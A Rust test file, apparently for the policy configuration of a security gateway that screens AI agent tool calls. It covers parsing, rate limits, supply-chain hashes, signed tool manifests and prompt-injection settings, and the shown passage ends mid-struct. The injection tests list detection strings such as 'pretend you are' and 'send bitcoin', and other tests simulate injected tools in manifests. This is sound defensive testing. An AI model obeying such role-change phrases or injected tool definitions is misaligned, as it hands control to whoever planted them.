use super::*;

#[test]
fn test_from_json_basic() {
    let json = r#"{"policies":[{"name":"test","tool_pattern":"*","function_pattern":"*","policy_type":"Allow"}]}"#;
    let config = PolicyConfig::from_json(json).unwrap();
    assert_eq!(config.policies.len(), 1);
    assert_eq!(config.policies[0].name, "test");
}

#[test]
fn test_from_toml_basic() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.policies.len(), 1);
}

#[test]
fn test_priority_defaults_to_zero() {
    // SECURITY (R19-CFG-1): Priority defaults to 0 (lowest) so that
    // omitting priority makes policies match last, preventing accidental
    // high-priority Allow rules from gutting deny rules.
    let toml = r#"
[[policies]]
name = "no priority"
tool_pattern = "t"
function_pattern = "f"
policy_type = "Deny"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.policies[0].priority, Some(0));
    let policies = config.to_policies();
    assert_eq!(policies[0].priority, 0);
}

#[test]
fn test_id_defaults_to_pattern_combo() {
    let toml = r#"
[[policies]]
name = "auto id"
tool_pattern = "bash"
function_pattern = "exec"
policy_type = "Deny"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.policies[0].id.is_none());
    let policies = config.to_policies();
    assert_eq!(policies[0].id, "bash:exec");
}

#[test]
fn test_explicit_id_preserved() {
    let toml = r#"
[[policies]]
name = "custom"
tool_pattern = "bash"
function_pattern = "*"
policy_type = "Deny"
id = "my-custom-id"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    let policies = config.to_policies();
    assert_eq!(policies[0].id, "my-custom-id");
}

#[test]
fn test_to_policies_converts_all() {
    let toml = r#"
[[policies]]
name = "a"
tool_pattern = "t1"
function_pattern = "f1"
policy_type = "Allow"
priority = 10

[[policies]]
name = "b"
tool_pattern = "t2"
function_pattern = "f2"
policy_type = "Deny"
priority = 200
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    let policies = config.to_policies();
    assert_eq!(policies.len(), 2);
    assert_eq!(policies[0].priority, 10);
    assert_eq!(policies[1].priority, 200);
}

#[test]
fn test_injection_config_defaults_when_absent() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.injection.enabled);
    // SECURITY: Default changed to true for fail-closed behavior
    assert!(config.injection.block_on_injection);
    assert!(config.injection.extra_patterns.is_empty());
    assert!(config.injection.disabled_patterns.is_empty());
}

#[test]
fn test_injection_config_block_on_injection() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[injection]
enabled = true
block_on_injection = true
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.injection.enabled);
    assert!(config.injection.block_on_injection);
}

#[test]
fn test_injection_config_custom_patterns() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[injection]
enabled = true
extra_patterns = ["transfer funds", "send bitcoin"]
disabled_patterns = ["pretend you are"]
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.injection.enabled);
    assert_eq!(config.injection.extra_patterns.len(), 2);
    assert_eq!(config.injection.extra_patterns[0], "transfer funds");
    assert_eq!(config.injection.disabled_patterns.len(), 1);
    assert_eq!(config.injection.disabled_patterns[0], "pretend you are");
}

#[test]
fn test_injection_config_disabled() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[injection]
enabled = false
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(!config.injection.enabled);
}

#[test]
fn test_load_file_toml() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("policy.toml");
    std::fs::write(
        &path,
        r#"
[[policies]]
name = "deny bash"
tool_pattern = "bash"
function_pattern = "*"
policy_type = "Deny"
priority = 20
"#,
    )
    .unwrap();

    let config = PolicyConfig::load_file(path.to_str().unwrap()).unwrap();
    assert_eq!(config.policies.len(), 1);
    assert_eq!(config.policies[0].name, "deny bash");
    assert_eq!(config.policies[0].tool_pattern, "bash");
}

#[test]
fn test_load_file_json() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("policy.json");
    std::fs::write(
        &path,
        r#"{
                "policies": [{
                    "name": "allow read",
                    "tool_pattern": "read_file",
                    "function_pattern": "*",
                    "policy_type": "Allow"
                }]
            }"#,
    )
    .unwrap();

    let config = PolicyConfig::load_file(path.to_str().unwrap()).unwrap();
    assert_eq!(config.policies.len(), 1);
    assert_eq!(config.policies[0].name, "allow read");
}

#[test]
fn test_load_file_not_found() {
    let result = PolicyConfig::load_file("/nonexistent/path/policy.toml");
    assert!(result.is_err());
}

#[test]
fn test_load_file_invalid_toml() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("bad.toml");
    std::fs::write(&path, "this is not valid toml {{{").unwrap();

    let result = PolicyConfig::load_file(path.to_str().unwrap());
    assert!(result.is_err());
}

#[test]
fn test_load_file_invalid_json() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("bad.json");
    std::fs::write(&path, "{invalid json!}").unwrap();

    let result = PolicyConfig::load_file(path.to_str().unwrap());
    assert!(result.is_err());
}

// SECURITY (FIND-R46-014): Unknown file extension now returns an error instead of
// silently falling back to TOML parsing. Silent fallback can mask misconfiguration.
#[test]
fn test_load_file_unknown_extension_returns_error() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("policy.conf");
    std::fs::write(
        &path,
        r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();

    // Unknown extension should return an error
    let result = PolicyConfig::load_file(path.to_str().unwrap());
    assert!(result.is_err());
    let err = result.unwrap_err().to_string();
    assert!(err.contains("unsupported extension"), "error: {}", err);
}

#[test]
fn test_rate_limit_config_defaults_when_absent() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.rate_limit.evaluate_rps.is_none());
    assert!(config.rate_limit.evaluate_burst.is_none());
    assert!(config.rate_limit.admin_rps.is_none());
    assert!(config.rate_limit.admin_burst.is_none());
    assert!(config.rate_limit.readonly_rps.is_none());
    assert!(config.rate_limit.readonly_burst.is_none());
    assert!(config.rate_limit.per_ip_rps.is_none());
    assert!(config.rate_limit.per_ip_burst.is_none());
    assert!(config.rate_limit.per_ip_max_capacity.is_none());
    assert!(config.rate_limit.per_principal_rps.is_none());
    assert!(config.rate_limit.per_principal_burst.is_none());
}

#[test]
fn test_rate_limit_config_parses_values() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[rate_limit]
evaluate_rps = 1000
evaluate_burst = 50
admin_rps = 20
admin_burst = 5
readonly_rps = 200
readonly_burst = 20
per_ip_rps = 100
per_ip_burst = 10
per_ip_max_capacity = 50000
per_principal_rps = 50
per_principal_burst = 10
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.rate_limit.evaluate_rps, Some(1000));
    assert_eq!(config.rate_limit.evaluate_burst, Some(50));
    assert_eq!(config.rate_limit.admin_rps, Some(20));
    assert_eq!(config.rate_limit.admin_burst, Some(5));
    assert_eq!(config.rate_limit.readonly_rps, Some(200));
    assert_eq!(config.rate_limit.readonly_burst, Some(20));
    assert_eq!(config.rate_limit.per_ip_rps, Some(100));
    assert_eq!(config.rate_limit.per_ip_burst, Some(10));
    assert_eq!(config.rate_limit.per_ip_max_capacity, Some(50000));
    assert_eq!(config.rate_limit.per_principal_rps, Some(50));
    assert_eq!(config.rate_limit.per_principal_burst, Some(10));
}

#[test]
fn test_rate_limit_config_partial_values() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[rate_limit]
evaluate_rps = 500
per_ip_rps = 50
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.rate_limit.evaluate_rps, Some(500));
    assert!(config.rate_limit.evaluate_burst.is_none());
    assert!(config.rate_limit.admin_rps.is_none());
    assert_eq!(config.rate_limit.per_ip_rps, Some(50));
    assert!(config.rate_limit.per_ip_burst.is_none());
    assert!(config.rate_limit.per_ip_max_capacity.is_none());
    assert!(config.rate_limit.per_principal_rps.is_none());
    assert!(config.rate_limit.per_principal_burst.is_none());
}

// --- Supply chain verification tests ---

#[test]
fn test_supply_chain_disabled_always_passes() {
    let config = SupplyChainConfig {
        enabled: false,
        allowed_servers: std::collections::HashMap::new(),
        ..Default::default()
    };
    assert!(config.verify_binary("/nonexistent/path").is_ok());
}

#[test]
fn test_supply_chain_correct_hash_passes() {
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("fake-server");
    std::fs::write(&bin_path, b"hello server binary").unwrap();

    // Compute expected hash
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    hasher.update(b"hello server binary");
    let expected_hash = hex::encode(hasher.finalize());

    let mut allowed = std::collections::HashMap::new();
    allowed.insert(bin_path.to_string_lossy().to_string(), expected_hash);

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    assert!(config.verify_binary(&bin_path.to_string_lossy()).is_ok());
}

#[test]
fn test_supply_chain_wrong_hash_fails() {
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("fake-server");
    std::fs::write(&bin_path, b"hello server binary").unwrap();

    let mut allowed = std::collections::HashMap::new();
    allowed.insert(
        bin_path.to_string_lossy().to_string(),
        "0000000000000000000000000000000000000000000000000000000000000000".to_string(),
    );

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    let result = config.verify_binary(&bin_path.to_string_lossy());
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Hash mismatch"));
}

#[test]
fn test_supply_chain_unlisted_binary_fails() {
    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: std::collections::HashMap::new(),
        ..Default::default()
    };
    let result = config.verify_binary("/usr/bin/something");
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("not in allowed_servers"));
}

#[test]
fn test_supply_chain_missing_binary_fails() {
    let mut allowed = std::collections::HashMap::new();
    allowed.insert(
        "/nonexistent/binary".to_string(),
        "abcdef1234567890".to_string(),
    );

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    let result = config.verify_binary("/nonexistent/binary");
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Cannot read metadata"));
}

// --- Manifest verification tests ---

fn make_tools_list_response(tools: &[(&str, serde_json::Value)]) -> serde_json::Value {
    let tool_entries: Vec<serde_json::Value> = tools
        .iter()
        .map(|(name, schema)| {
            serde_json::json!({
                "name": name,
                "inputSchema": schema,
            })
        })
        .collect();
    serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": { "tools": tool_entries }
    })
}

#[test]
fn test_manifest_from_tools_list() {
    let response = make_tools_list_response(&[
        (
            "read_file",
            serde_json::json!({"type": "object", "properties": {"path": {"type": "string"}}}),
        ),
        (
            "write_file",
            serde_json::json!({"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}}}),
        ),
    ]);
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    assert_eq!(manifest.schema_version, "2.0");
    assert_eq!(manifest.tools.len(), 2);
    // Tools should be sorted by name
    assert_eq!(manifest.tools[0].name, "read_file");
    assert_eq!(manifest.tools[1].name, "write_file");
    // Hashes should be non-empty hex strings
    assert_eq!(manifest.tools[0].input_schema_hash.len(), 64);
}

#[test]
fn test_manifest_verify_identical_passes() {
    let response = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        (
            "tool_b",
            serde_json::json!({"type": "object", "properties": {}}),
        ),
    ]);
    let pinned = ToolManifest::from_tools_list(&response).unwrap();
    let result = pinned.verify(&response);
    assert!(result.passed);
    assert!(result.discrepancies.is_empty());
}

#[test]
fn test_manifest_verify_new_tool_detected() {
    let original = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let modified = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        ("tool_b", serde_json::json!({"type": "object"})),
    ]);
    let pinned = ToolManifest::from_tools_list(&original).unwrap();
    let result = pinned.verify(&modified);
    assert!(!result.passed);
    assert!(result
        .discrepancies
        .iter()
        .any(|d| d.contains("New tool 'tool_b'")));
}

#[test]
fn test_manifest_verify_removed_tool_detected() {
    let original = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        ("tool_b", serde_json::json!({"type": "object"})),
    ]);
    let modified = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let pinned = ToolManifest::from_tools_list(&original).unwrap();
    let result = pinned.verify(&modified);
    assert!(!result.passed);
    assert!(result.discrepancies.iter().any(|d| d.contains("removed")));
}

#[test]
fn test_manifest_verify_schema_change_detected() {
    let original = make_tools_list_response(&[(
        "tool_a",
        serde_json::json!({"type": "object", "properties": {"path": {"type": "string"}}}),
    )]);
    let modified = make_tools_list_response(&[(
        "tool_a",
        serde_json::json!({"type": "object", "properties": {"path": {"type": "string"}, "force": {"type": "boolean"}}}),
    )]);
    let pinned = ToolManifest::from_tools_list(&original).unwrap();
    let result = pinned.verify(&modified);
    assert!(!result.passed);
    assert!(result
        .discrepancies
        .iter()
        .any(|d| d.contains("schema changed")));
}

#[test]
fn test_manifest_verify_invalid_response() {
    let pinned = ToolManifest {
        schema_version: "1.0".to_string(),
        tools: vec![],
        signature: None,
        created_at: None,
        verifying_key: None,
    };
    let bad_response = serde_json::json!({"error": "something"});
    let result = pinned.verify(&bad_response);
    assert!(!result.passed);
    assert!(result
        .discrepancies
        .iter()
        .any(|d| d.contains("Failed to parse")));
}

#[test]
fn test_manifest_config_disabled_always_passes() {
    let config = ManifestConfig {
        enabled: false,
        trusted_keys: vec![],
        enforcement: ManifestEnforcement::default(),
        manifest_path: None,
        require_signature: false,
    };
    let pinned = ToolManifest {
        schema_version: "1.0".to_string(),
        tools: vec![ManifestToolEntry {
            name: "tool_a".to_string(),
            input_schema_hash: "deadbeef".to_string(),
            description_hash: None,
            title_hash: None,
            annotations: None,
        }],
        signature: None,
        created_at: None,
        verifying_key: None,
    };
    // Even with a completely wrong response, disabled config passes
    let bad_response = serde_json::json!({"error": "something"});
    assert!(config.verify_manifest(&pinned, &bad_response).is_ok());
}

#[test]
fn test_manifest_config_enabled_detects_mismatch() {
    let config = ManifestConfig {
        enabled: true,
        trusted_keys: vec![],
        enforcement: ManifestEnforcement::Block,
        manifest_path: None,
        require_signature: false,
    };
    let original = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let pinned = ToolManifest::from_tools_list(&original).unwrap();

    let modified = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        ("injected_tool", serde_json::json!({"type": "object"})),
    ]);
    let result = config.verify_manifest(&pinned, &modified);
    assert!(result.is_err());
    let discrepancies = result.unwrap_err();
    assert!(discrepancies.iter().any(|d| d.contains("injected_tool")));
}

#[test]
fn test_manifest_tool_without_schema() {
    // Tools without inputSchema should still get a hash (of empty string)
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [
                {"name": "simple_tool"}
            ]
        }
    });
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    assert_eq!(manifest.tools.len(), 1);
    assert_eq!(manifest.tools[0].name, "simple_tool");
    // Hash of empty string
    assert_eq!(manifest.tools[0].input_schema_hash.len(), 64);
}

// ═══════════════════════════════════════════════════
// MANIFEST SIGNING TESTS (C-17.2)
// ═══════════════════════════════════════════════════

#[test]
fn test_manifest_sign_and_verify_roundtrip() {
    let signing_key = ed25519_dalek::SigningKey::generate(&mut rand::thread_rng());
    let vk_hex = hex::encode(signing_key.verifying_key().as_bytes());

    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let mut manifest = ToolManifest::from_tools_list(&response).unwrap();
    manifest.created_at = Some("2026-02-04T12:00:00Z".to_string());
    manifest.sign(&signing_key);

    assert!(manifest.signature.is_some());
    assert!(manifest.verifying_key.is_some());
    assert!(manifest.verify_signature(&vk_hex).is_ok());
}

#[test]
fn test_manifest_verify_with_wrong_key_fails() {
    let signing_key = ed25519_dalek::SigningKey::generate(&mut rand::thread_rng());
    let other_key = ed25519_dalek::SigningKey::generate(&mut rand::thread_rng());
    let other_vk_hex = hex::encode(other_key.verifying_key().as_bytes());

    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let mut manifest = ToolManifest::from_tools_list(&response).unwrap();
    manifest.sign(&signing_key);

    assert!(manifest.verify_signature(&other_vk_hex).is_err());
}

#[test]
fn test_manifest_tampered_manifest_fails() {
    let signing_key = ed25519_dalek::SigningKey::generate(&mut rand::thread_rng());
    let vk_hex = hex::encode(signing_key.verifying_key().as_bytes());

    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let mut manifest = ToolManifest::from_tools_list(&response).unwrap();
    manifest.sign(&signing_key);

    // Tamper with the manifest
    manifest.tools.push(ManifestToolEntry {
        name: "injected".to_string(),
        input_schema_hash: "deadbeef".to_string(),
        description_hash: None,
        title_hash: None,
        annotations: None,
    });

    assert!(manifest.verify_signature(&vk_hex).is_err());
}

#[test]
fn test_manifest_unsigned_when_required_fails() {
    let signing_key = ed25519_dalek::SigningKey::generate(&mut rand::thread_rng());
    let vk_hex = hex::encode(signing_key.verifying_key().as_bytes());

    let config = ManifestConfig {
        enabled: true,
        trusted_keys: vec![vk_hex],
        enforcement: ManifestEnforcement::Block,
        manifest_path: None,
        require_signature: true,
    };

    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let pinned = ToolManifest::from_tools_list(&response).unwrap();
    // pinned is NOT signed
    let result = config.verify_manifest(&pinned, &response);
    assert!(result.is_err());
}

#[test]
fn test_manifest_no_trusted_keys_skips_signature() {
    let config = ManifestConfig {
        enabled: true,
        trusted_keys: vec![],
        enforcement: ManifestEnforcement::Block,
        manifest_path: None,
        require_signature: false,
    };
    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let pinned = ToolManifest::from_tools_list(&response).unwrap();
    let result = config.verify_manifest(&pinned, &response);
    assert!(result.is_ok());
}

#[test]
fn test_manifest_signing_content_deterministic() {
    let response = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        ("tool_b", serde_json::json!({"type": "string"})),
    ]);
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    let c1 = manifest.signing_content();
    let c2 = manifest.signing_content();
    assert_eq!(c1, c2);
}

#[test]
fn test_manifest_description_hash_populated() {
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [{
                "name": "tool_a",
                "description": "A helpful tool",
                "inputSchema": {"type": "object"}
            }]
        }
    });
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    assert!(manifest.tools[0].description_hash.is_some());
    assert_eq!(
        manifest.tools[0].description_hash.as_ref().unwrap().len(),
        64
    );
}

#[test]
fn test_manifest_annotations_snapshot() {
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [{
                "name": "tool_a",
                "inputSchema": {"type": "object"},
                "annotations": {
                    "readOnlyHint": true,
                    "destructiveHint": false
                }
            }]
        }
    });
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    let ann = manifest.tools[0].annotations.as_ref().unwrap();
    assert_eq!(ann.read_only_hint, Some(true));
    assert_eq!(ann.destructive_hint, Some(false));
    assert_eq!(ann.idempotent_hint, None);
}

#[test]
fn test_manifest_load_save_roundtrip() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("manifest.json");

    let signing_key = ed25519_dalek::SigningKey::generate(&mut rand::thread_rng());
    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let mut manifest = ToolManifest::from_tools_list(&response).unwrap();
    manifest.sign(&signing_key);

    manifest.save_manifest(path.to_str().unwrap()).unwrap();
    let loaded = ToolManifest::load_pinned_manifest(path.to_str().unwrap()).unwrap();
    assert_eq!(manifest, loaded);
}

#[test]
fn test_manifest_backward_compat_v1() {
    // v1 manifests (without new fields) should deserialize fine
    let json = r#"{
            "schema_version": "1.0",
            "tools": [{"name": "tool_a", "input_schema_hash": "abcdef1234567890"}]
        }"#;
    let manifest: ToolManifest = serde_json::from_str(json).unwrap();
    assert_eq!(manifest.schema_version, "1.0");
    assert_eq!(manifest.tools[0].name, "tool_a");
    assert!(manifest.signature.is_none());
    assert!(manifest.created_at.is_none());
    assert!(manifest.verifying_key.is_none());
    assert!(manifest.tools[0].description_hash.is_none());
    assert!(manifest.tools[0].annotations.is_none());
}

#[test]
fn test_manifest_verify_signature_any() {
    let key1 = ed25519_dalek::SigningKey::generate(&mut rand::thread_rng());
    let key2 = ed25519_dalek::SigningKey::generate(&mut rand::thread_rng());
    let vk1 = hex::encode(key1.verifying_key().as_bytes());
    let vk2 = hex::encode(key2.verifying_key().as_bytes());

    let response = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let mut manifest = ToolManifest::from_tools_list(&response).unwrap();
    manifest.sign(&key1);

    // Should pass with key1 in the list
    assert!(manifest
        .verify_signature_any(&[vk2.clone(), vk1.clone()])
        .is_ok());
    // Should fail with only key2
    assert!(manifest.verify_signature_any(&[vk2]).is_err());
}

// --- Custom PII pattern config tests ---

#[test]
fn test_custom_pii_patterns_default_empty() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.audit.custom_pii_patterns.is_empty());
}

#[test]
fn test_custom_pii_patterns_parsed() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"

[[audit.custom_pii_patterns]]
name = "employee_id"
pattern = "EMP-\\d{6}"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.audit.custom_pii_patterns.len(), 1);
    assert_eq!(config.audit.custom_pii_patterns[0].name, "employee_id");
}

// --- Supply chain new methods tests ---

#[test]
fn test_supply_chain_compute_hash() {
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("test-binary");
    std::fs::write(&bin_path, b"hello").unwrap();

    let hash = SupplyChainConfig::compute_hash(bin_path.to_str().unwrap()).unwrap();
    assert_eq!(hash.len(), 64); // SHA-256 hex
                                // Hash of "hello"
    assert_eq!(
        hash,
        "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
    );
}

#[test]
fn test_supply_chain_validate_paths_all_exist() {
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("server");
    std::fs::write(&bin_path, b"binary").unwrap();

    let mut allowed = std::collections::HashMap::new();
    allowed.insert(bin_path.to_string_lossy().to_string(), "hash".to_string());

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    assert!(config.validate_paths().is_ok());
}

#[test]
fn test_supply_chain_validate_paths_missing() {
    let mut allowed = std::collections::HashMap::new();
    allowed.insert("/nonexistent/server".to_string(), "hash".to_string());

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    let result = config.validate_paths();
    assert!(result.is_err());
    let missing = result.unwrap_err();
    assert!(missing.contains(&"/nonexistent/server".to_string()));
}

// --- ManifestEnforcement tests ---

#[test]
fn test_manifest_enforcement_warn_allows_schema_mismatch() {
    let config = ManifestConfig {
        enabled: true,
        trusted_keys: vec![],
        enforcement: ManifestEnforcement::Warn,
        manifest_path: None,
        require_signature: false,
    };
    let original = make_tools_list_response(&[("tool_a", serde_json::json!({"type": "object"}))]);
    let pinned = ToolManifest::from_tools_list(&original).unwrap();
    let modified = make_tools_list_response(&[
        ("tool_a", serde_json::json!({"type": "object"})),
        ("injected_tool", serde_json::json!({"type": "object"})),
    ]);
    // Warn mode: schema mismatches are non-blocking
    let result = config.verify_manifest(&pinned, &modified);
    assert!(result.is_ok());
}

// --- Config validation bounds tests ---

#[test]
fn test_validate_passes_for_normal_config() {
    let toml = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_too_many_custom_pii_patterns() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    config.audit.custom_pii_patterns = (0..=MAX_CUSTOM_PII_PATTERNS)
        .map(|i| CustomPiiPattern {
            name: format!("pat_{}", i),
            pattern: format!("pattern{}", i),
        })
        .collect();
    let err = config.validate().unwrap_err();
    assert!(err.contains("custom_pii_patterns"));
    assert!(err.contains(&MAX_CUSTOM_PII_PATTERNS.to_string()));
}

#[test]
fn test_validate_rejects_too_many_extra_injection_patterns() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    config.injection.extra_patterns = (0..=MAX_EXTRA_INJECTION_PATTERNS)
        .map(|i| format!("pattern {}", i))
        .collect();
    let err = config.validate().unwrap_err();
    assert!(err.contains("extra_patterns"));
}

#[test]
fn test_validate_rejects_invalid_dlp_regex() {
    // FIND-002: DLP extra_patterns with invalid regex should be rejected at config load
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    // Invalid regex: unclosed bracket
    config.dlp.extra_patterns = vec![("bad_pattern".to_string(), "[unclosed".to_string())];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("dlp.extra_patterns") && err.contains("invalid regex"),
        "Error should mention dlp.extra_patterns and invalid regex: {}",
        err
    );
}

#[test]
fn test_validate_rejects_invalid_custom_pii_regex() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    config.audit.custom_pii_patterns = vec![CustomPiiPattern {
        name: "bad_pii".to_string(),
        pattern: "[unclosed".to_string(),
    }];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("audit.custom_pii_patterns") && err.contains("invalid regex"),
        "Error should mention audit.custom_pii_patterns and invalid regex: {}",
        err
    );
}

#[test]
fn test_validate_accepts_valid_custom_pii_regex() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    config.audit.custom_pii_patterns = vec![CustomPiiPattern {
        name: "employee_id".to_string(),
        pattern: r"EMP-\d{6}".to_string(),
    }];
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_accepts_valid_dlp_regex() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    // Valid regex pattern
    config.dlp.extra_patterns = vec![(
        "my_token".to_string(),
        r"my_token_[A-Za-z0-9]{32}".to_string(),
    )];
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_too_many_policies() {
    let mut config = PolicyConfig {
        policies: Vec::new(),
        injection: InjectionConfig::default(),
        dlp: DlpConfig::default(),
        multimodal: MultimodalPolicyConfig::default(),
        rate_limit: RateLimitConfig::default(),
        audit: AuditConfig::default(),
        supply_chain: SupplyChainConfig::default(),
        manifest: ManifestConfig::default(),
        memory_tracking: MemoryTrackingConfig::default(),
        elicitation: ElicitationConfig::default(),
        sampling: SamplingConfig::default(),
        audit_export: AuditExportConfig::default(),
        max_path_decode_iterations: None,
        known_tool_names: vec![],
        tool_registry: ToolRegistryConfig::default(),
        allowed_origins: vec![],
        behavioral: BehavioralDetectionConfig::default(),
        data_flow: DataFlowTrackingConfig::default(),
        semantic_detection: SemanticDetectionConfig::default(),
        cluster: ClusterConfig::default(),
        async_tasks: AsyncTaskConfig::default(),
        resource_indicator: ResourceIndicatorConfig::default(),
        cimd: CimdConfig::default(),
        step_up_auth: StepUpAuthConfig::default(),
        circuit_breaker: CircuitBreakerConfig::default(),
        deputy: DeputyConfig::default(),
        shadow_agent: ShadowAgentConfig::default(),
        schema_poisoning: SchemaPoisoningConfig::default(),
        sampling_detection: SamplingDetectionConfig::default(),
        cross_agent: CrossAgentConfig::default(),
        advanced_threat: AdvancedThreatConfig::default(),
        tls: TlsConfig::default(),
        spiffe: SpiffeConfig::default(),
        opa: OpaConfig::default(),
        threat_intel: ThreatIntelConfig::default(),
        jit_access: JitAccessConfig::default(),
        etdi: EtdiConfig::default(),
        memory_security: MemorySecurityConfig::default(),
        nhi: NhiConfig::default(),
        rag_defense: RagDefenseConfig::default(),
        a2a: A2aConfig::default(),
        observability: ObservabilityConfig::default(),
        metrics_require_auth: true,
        limits: LimitsConfig::default(),
        compliance: ComplianceConfig::default(),
        extension: ExtensionConfig::default(),
        transport: TransportConfig::default(),
        gateway: GatewayConfig::default(),
        abac: AbacConfig::default(),
        fips: Default::default(),
        governance: Default::default(),
        deployment: Default::default(),
